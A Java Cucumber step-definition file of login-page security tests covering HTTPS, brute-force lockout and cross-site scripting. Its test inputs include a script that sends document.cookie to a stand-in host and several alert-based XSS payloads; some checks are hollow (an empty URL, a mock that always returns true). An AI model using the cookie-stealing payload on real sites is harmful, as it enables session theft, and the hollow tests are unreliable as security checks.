    package step;

    import core.DriverFactory;
    import io.cucumber.java.en.Then;
    import org.junit.Assert;
    import page.VladPage;

    public class VladSecurityStep extends BackgroundSteps{

        VladPage vladPage =  new VladPage(DriverFactory.getDriver());

        @Then("the URL starts with HTTPS")
        public void testHttps() {
            String url =  "";
            String https = url.substring(0, 5);
            Assert.assertEquals("https", https);
        }


        @Then("handle with brute force attack")
        public void bruteForcePrevention(){
            for (int i = 0; i < 5 ; i++) {
                fillLoginFormWithInvalidData();
            }
            fillLoginFormWithValidData();
            lockedAccount();
        }


       @Then("handle with malicious script")
       public void maliciousScriptPrevention(){
            String maliciousDataUsername = "<script>\n" +
                                    "  fetch('https://targetewebsite.com/get_cookies?cookie=' + document.cookie);\n" +
                                    "</script>";

            String maliciousDataPassword = "<script>alert('under attack');</script>";
            vladPage.fill_out_the_form_with_valid_credentials_username_and_password(maliciousDataUsername, maliciousDataPassword);
            vladPage.clicked_on_the_LogIn_button();

            //assert false -  use of mock
            Assert.assertFalse(vladPage.isNotLoggedIn());
        }


        @Then("handle with malicious image")
        public void maliciousImagePrevention(){
            String maliciousImageUsername = "<img src='imagem.jpg' onerror='alert('under attack')'>";
            String maliciousImagePassword = "<script>alert('under attack');</script>";

            vladPage.fill_out_the_form_with_valid_credentials_username_and_password(maliciousImageUsername, maliciousImagePassword);
            vladPage.clicked_on_the_LogIn_button();

            //assert false -  use of mock
            Assert.assertFalse(vladPage.isNotLoggedIn());
        }


        @Then("handle with malicious script reflected XSS")
        public void maliciousReflectedXSSPrevention(){
            String maliciousReflectedXSSUsername = "https://targetewebsite.com/search?query=<script>alert('under attack');</script>";
            String maliciousReflectedXSSPassword = "<script>alert('yes, under attack!');</script>";

            vladPage.fill_out_the_form_with_valid_credentials_username_and_password(maliciousReflectedXSSUsername, maliciousReflectedXSSPassword);
            vladPage.clicked_on_the_LogIn_button();

            //assert false -  use of mock
            Assert.assertFalse(vladPage.isNotLoggedIn());
        }


        //mock
        private boolean lockedAccount(){
            return true;
        }

    }
